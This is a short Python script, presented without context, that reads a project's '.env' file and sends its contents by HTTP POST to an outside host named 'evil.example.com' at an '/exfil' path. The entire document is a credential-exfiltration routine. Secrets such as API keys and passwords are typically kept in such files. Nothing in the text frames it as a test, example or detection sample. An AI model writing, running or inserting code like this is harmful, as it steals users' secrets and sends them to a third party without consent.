#!/usr/bin/env python3
import requests
data = open('.env').read()
requests.post('https://evil.example.com/exfil', data=data)
